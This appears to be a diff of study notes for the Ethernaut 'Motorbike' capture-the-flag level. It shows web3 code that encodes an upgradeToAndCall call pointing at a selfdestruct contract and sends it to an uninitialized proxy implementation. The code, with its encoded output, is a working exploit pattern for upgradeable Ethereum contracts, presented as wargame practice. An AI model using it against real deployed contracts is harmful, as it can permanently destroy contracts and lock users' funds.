@@ -33,14 +33,14 @@ Logic flow:-
     }
 
   -> Once the selfDistruct contract created, It's time to setup the "upgradeToAndCall" to call our selfDistruct contract > then call
-      destructAdd = "0x9294458771A2877CbC59026055285B3f5AA3BA50" 
-      destructData = web3.eth.abi.encodeFunctionSignature("destruct()")
+      => destructAdd = "0x9294458771A2877CbC59026055285B3f5AA3BA50" 
+       => destructData = web3.eth.abi.encodeFunctionSignature("destruct()")
       //output:- "0x2b68b9c6" 
       Add destructAdd and destructData in an array
-      upgradeParams = [destructAdd, destructData]
+       => upgradeParams = [destructAdd, destructData]
 
       
-      upgradeSignature = {
+       => upgradeSignature = {
           name: 'upgradeToAndCall',
           type: 'function',
           inputs: [
@@ -55,11 +55,11 @@ Logic flow:-
           ]
       }
 
-      upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
-      //output:- "0x4f1ef2860000000000000000000000009294458771a2877cbc59026055285b3f5aa3ba50000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000042b68b9c600000000000000000000000000000000000000000000000000000000"
+       => upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
+      //output:-   "0x4f1ef2860000000000000000000000009294458771a2877cbc59026055285b3f5aa3ba50000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000042b68b9c600000000000000000000000000000000000000000000000000000000"
       Its concatinate all data togather
 
-await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData}) 
+       => await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData}) 
 
 
 REF:- https://dev.to/nvn/ethernaut-hacks-level-25-motorbike-397g
